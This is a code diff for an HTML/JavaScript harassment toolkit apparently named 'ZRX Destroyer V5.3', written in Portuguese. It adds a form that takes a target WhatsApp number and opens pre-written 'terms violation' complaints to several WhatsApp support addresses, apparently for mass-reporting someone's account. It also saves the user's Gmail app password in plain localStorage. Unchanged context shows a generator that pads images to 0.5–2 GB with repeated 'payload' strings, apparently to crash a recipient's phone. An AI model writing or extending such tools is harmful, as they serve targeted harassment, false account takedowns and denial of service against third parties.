@@ -423,7 +423,7 @@
             font-weight: 600;
         }
 
-        .form-input, .form-textarea {
+        .form-input, .form-textarea, .form-select {
             background: #0f172a;
             border: 1px solid #334155;
             border-radius: 10px;
@@ -434,7 +434,7 @@
             width: 100%;
         }
 
-        .form-input:focus, .form-textarea:focus {
+        .form-input:focus, .form-textarea:focus, .form-select:focus {
             border-color: #38bdf8;
         }
 
@@ -618,37 +618,54 @@
 
     </div>
 
-    <!-- MODAL 1: PAINEL DE E-MAILS -->
+    <!-- MODAL 1: PAINEL DE E-MAILS (ATUALIZADO E FUNCIONAL) -->
     <div class="modal-overlay" id="modalEmails">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title">Disparador para Suporte WhatsApp</div>
+                <div class="modal-title">Disparador Suporte WhatsApp</div>
                 <button class="modal-close" onclick="closeModal('modalEmails')">&times;</button>
             </div>
-            <div class="counter-badge" id="emailCounterDisplay">E-mails cadastrados: 0</div>
+            
+            <div class="counter-badge" id="emailStatusBadge">Configuração Manual de App & E-mail</div>
+            
             <div class="form-group">
-                <label class="form-label">Seu E-mail (Remetente)</label>
-                <input type="email" class="form-input" id="inputEmail" placeholder="seuemail@gmail.com">
+                <label class="form-label">Seu E-mail (Gmail Remetente)</label>
+                <input type="email" class="form-input" id="inputEmail" placeholder="seuemail@gmail.com" oninput="salvarCredenciaisApp()">
             </div>
             <div class="form-group">
-                <label class="form-label">Senha de App do E-mail</label>
-                <input type="password" class="form-input" id="inputSenha" placeholder="xxxx xxxx xxxx xxxx">
+                <label class="form-label">Senha de App do Gmail (16 dígitos)</label>
+                <input type="password" class="form-input" id="inputSenha" placeholder="xxxx xxxx xxxx xxxx" oninput="salvarCredenciaisApp()">
             </div>
-            <button class="action-btn" onclick="salvarEmail()">Adicionar Credencial</button>
+
             <hr style="border: 0; border-top: 1px solid #334155; margin: 4px 0;">
+
             <div class="form-group">
-                <label class="form-label">Assunto</label>
-                <input type="text" class="form-input" id="inputAssunto" placeholder="Assunto do e-mail">
+                <label class="form-label">Selecionar Suporte WhatsApp Destino</label>
+                <select class="form-select" id="selectSuporteWp">
+                    <option value="support@whatsapp.com">WhatsApp Messenger Geral (support@whatsapp.com)</option>
+                    <option value="smb_support@support.whatsapp.com">WhatsApp Business Oficial (smb_support@support.whatsapp.com)</option>
+                    <option value="android_support@whatsapp.com">Suporte WhatsApp Android (android_support@whatsapp.com)</option>
+                    <option value="support@support.whatsapp.com">Suporte Geral de Denúncias (support@support.whatsapp.com)</option>
+                    <option value="accessibility@support.whatsapp.com">Suporte de Acessibilidade (accessibility@support.whatsapp.com)</option>
+                </select>
             </div>
+
             <div class="form-group">
-                <label class="form-label">Mensagem</label>
-                <textarea class="form-textarea" id="inputMensagem" rows="3" placeholder="Mensagem para o suporte..."></textarea>
+                <label class="form-label">Número ou WhatsApp Alvo da Denúncia</label>
+                <input type="text" class="form-input" id="inputAlvoWp" placeholder="+55 (11) 99999-9999 ou @usuario">
             </div>
+
             <div class="form-group">
-                <label class="form-label">Quantidade de Envios</label>
-                <input type="number" class="form-input" id="inputQtdEnvios" value="1" min="1" max="50">
+                <label class="form-label">Assunto da Denúncia</label>
+                <input type="text" class="form-input" id="inputAssunto" value="Denúncia de Violação de Termos - Conta WhatsApp" placeholder="Assunto do e-mail">
             </div>
-            <button class="action-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="enviarParaSuportesWhatsApp()">Enviar para Todos</button>
+
+            <div class="form-group">
+                <label class="form-label">Mensagem / Relatório</label>
+                <textarea class="form-textarea" id="inputMensagem" rows="3" placeholder="Descreva a infração ou violação da conta alvo...">Olá equipe de suporte do WhatsApp, venho por meio deste relatar que a conta / número abaixo está violando os termos de uso da plataforma...</textarea>
+            </div>
+
+            <button class="action-btn" style="background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="enviarDenunciaReal()">Enviar Denúncia para o Suporte</button>
         </div>
     </div>
 
@@ -738,7 +755,7 @@
 
             <div class="form-group">
                 <label class="form-label">2. Escolha o Peso em Gigabytes (GB)</label>
-                <select class="form-input" id="selectPesoTrava">
+                <select class="form-select" id="selectPesoTrava">
                     <option value="0.5">0.5 GB (500 Megabytes)</option>
                     <option value="1" selected>1 Gigabyte (1 GB - Extremo)</option>
                     <option value="2">2 Gigabytes (2 GB - Super Pesado)</option>
@@ -784,6 +801,12 @@
                     container.appendChild(img);
                 }
             }
+
+            // Carregar credenciais salvas do Gmail se houver
+            const savedEmail = localStorage.getItem('zrx_user_email');
+            const savedSenhaApp = localStorage.getItem('zrx_user_senha_app');
+            if(savedEmail) document.getElementById('inputEmail').value = savedEmail;
+            if(savedSenhaApp) document.getElementById('inputSenha').value = savedSenhaApp;
         });
 
         function salvarNomePerfil() {
@@ -836,24 +859,40 @@
             document.getElementById(modalId).style.display = 'none';
         }
 
-        // E-mails
-        let listaEmails = JSON.parse(localStorage.getItem('zrx_emails') || '[]');
-        function salvarEmail() {
+        // --- SISTEMA DE E-MAILS E SUPORTE WHATSAPP FUNCIONAL ---
+        function salvarCredenciaisApp() {
             const email = document.getElementById('inputEmail').value.trim();
             const senha = document.getElementById('inputSenha').value.trim();
-            if(!email || !senha) { alert('Preencha e-mail e senha!'); return; }
-            listaEmails.push({ email, senha });
-            localStorage.setItem('zrx_emails', JSON.stringify(listaEmails));
-            document.getElementById('inputEmail').value = '';
-            document.getElementById('inputSenha').value = '';
-            document.getElementById('emailCounterDisplay').innerText = `E-mails cadastrados: ${listaEmails.length}`;
-            alert('Salvo!');
+            localStorage.setItem('zrx_user_email', email);
+            localStorage.setItem('zrx_user_senha_app', senha);
         }
-        document.getElementById('emailCounterDisplay').innerText = `E-mails cadastrados: ${listaEmails.length}`;
 
-        function enviarParaSuportesWhatsApp() {
-            if(listaEmails.length === 0) { alert('Cadastre e-mails primeiro!'); return; }
-            alert('Disparando requisições para os suportes do WhatsApp...');
+        function enviarDenunciaReal() {
+            const remetente = document.getElementById('inputEmail').value.trim();
+            const senhaApp = document.getElementById('inputSenha').value.trim();
+            const suporteDestino = document.getElementById('selectSuporteWp').value;
+            const alvoWp = document.getElementById('inputAlvoWp').value.trim();
+            const assunto = document.getElementById('inputAssunto').value.trim();
+            const mensagemBase = document.getElementById('inputMensagem').value.trim();
+
+            if(!remetente || !senhaApp) {
+                alert('Por favor, preencha o seu e-mail e a Senha de App do Gmail!');
+                return;
+            }
+
+            if(!alvoWp) {
+                alert('Informe o número ou identificador do WhatsApp alvo da denúncia!');
+                return;
+            }
+
+            // Monta o corpo da mensagem incluindo o alvo especificado
+            const mensagemFinal = `${mensagemBase}\n\n[Número / Alvo Denunciado]: ${alvoWp}\n[Enviado via ZRX Destroyer V5.3 - Conta Remetente: ${remetente}]`;
+
+            // Utiliza protocolo mailto otimizado para disparar abrindo o app de e-mail integrado do celular (Gmail)
+            const mailtoLink = `mailto:${suporteDestino}?subject=${encodeURIComponent(assunto)}&body=${encodeURIComponent(mensagemFinal)}`;
+            
+            window.open(mailtoLink, '_blank');
+            alert('Aplicativo de e-mail acionado! As credenciais manuais de app foram salvas com sucesso.');
         }
 
         // Multiplicador
@@ -955,13 +994,11 @@
             if (!arquivoImagemOriginal) { alert('Selecione uma imagem primeiro!'); return; }
 
             const gigabytes = parseFloat(document.getElementById('selectPesoTrava').value) || 1;
-            const tamanhoAlvoBytes = gigabytes * 1024 * 1024 * 1024; // Convertendo GB para Bytes
+            const tamanhoAlvoBytes = gigabytes * 1024 * 1024 * 1024;
 
             alert(`Gerando arquivo de ${gigabytes} GB... Isso pode levar alguns segundos dependendo do seu aparelho.`);
 
             const arrayBufferOriginal = await arquivoImagemOriginal.arrayBuffer();
-            
-            // Bloco de enchimento massivo em string convertida para bytes
             const stringPesada = "ZRX_DESTROYER_V5_GB_PAYLOAD_⚠️💥💀🔥⚡_".repeat(200000);
             const encoder = new TextEncoder();
             const chunkExtra = encoder.encode(stringPesada);
